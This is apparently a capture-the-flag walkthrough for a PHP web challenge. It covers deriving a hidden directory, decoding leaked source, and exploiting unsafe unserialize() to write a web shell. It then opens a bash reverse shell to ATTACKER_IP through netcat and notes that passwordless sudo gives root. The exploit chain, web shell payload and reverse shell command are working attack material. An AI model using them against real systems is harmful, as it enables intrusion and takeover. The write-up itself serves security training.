## Calculating the Hidden Directory

The supplied `g^c` value needed to be raised to `a × b` modulo `p`.

This produces:

```text
(g^c)^(ab) mod p
```

which is equivalent to:

```text
g^(abc) mod p
```

The calculation can be performed with Python:

```python
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251

a = 330
b = 450

gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617

secret = pow(gc, a * b, p)

print(secret)
print(str(secret)[:128])
```

## Source Disclosure

Requesting `index.php` through the vulnerable parameter returned a long hexadecimal string:

```bash
curl -s "$BASE/?file=index.php"
```

The data was encoded using several transformations.

The source could be decoded by:

1. Converting hexadecimal back to bytes
2. Reversing the result
3. Base64 decoding it
4. Replacing HTML line breaks

A decoding pipeline:

```bash
curl -s "$BASE/?file=index.php" \
| grep -oE '^[0-9a-f]+' \
| xxd -r -p \
| rev \
| base64 -d \
| sed 's/<br \/>/\n/g'
```

The important PHP logic was equivalent to:

```php
class file {
    public $file = "dump.txt";
    public $data = "dump test";

    function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}

$file_name = $_GET['file'];

if ($file_name == "index.php") {
    $content = file_get_contents($file_name);
    $tags = array("", "");

    echo bin2hex(
        strrev(
            base64_encode(
                nl2br(
                    str_replace($tags, "", $content)
                )
            )
        )
    );
}

unserialize(file_get_contents($file_name));
```

The critical issue was:

```php
unserialize(file_get_contents($file_name));
```

The application loaded attacker-controlled content and passed it directly into `unserialize()`.

The `file` class destructor then wrote attacker-controlled data to an attacker-controlled filename:

```php
function __destruct() {
    file_put_contents($this->file, $this->data);
}
```

This allowed arbitrary file creation.

## Creating the Serialized Payload

A serialized object was generated that would write a PHP web shell named `shell.php`.

Generating it with PHP avoided manual string-length mistakes:

```bash
cd /tmp

php -r '
class file {
    public $file;
    public $data;
}

$x = new file();
$x->file = "shell.php";
$x->data = "<?php system(\$_GET[\"cmd\"]); ?>";

echo serialize($x), PHP_EOL;
' > payload.txt
```

The resulting payload resembled:

```text
O:4:"file":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

The payload was hosted from the AttackBox:

```bash
cd /tmp
python3 -m http.server 8000
```

## Reverse Shell

Start a listener:

```bash
rlwrap nc -lvnp 4444
```

A standard Netcat listener also works:

```bash
nc -lvnp 4444
```

Trigger a Bash reverse shell through the web shell:

```bash
curl -sG "$BASE/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

The connection returned as `www-data`.

Example:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Optional shell stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Key Vulnerabilities

The room relied on several chained weaknesses:

1. Sensitive cryptographic values exposed in HTML comments
2. Predictable hidden-directory derivation
3. Local file inclusion or arbitrary file reading
4. Obfuscated but recoverable PHP source
5. Unsafe PHP object deserialization
6. Arbitrary file write through a destructor
7. Web-accessible PHP file creation
8. Unrestricted passwordless sudo for `www-data`

The final sudo configuration meant that once code execution was achieved, full root compromise was immediate.
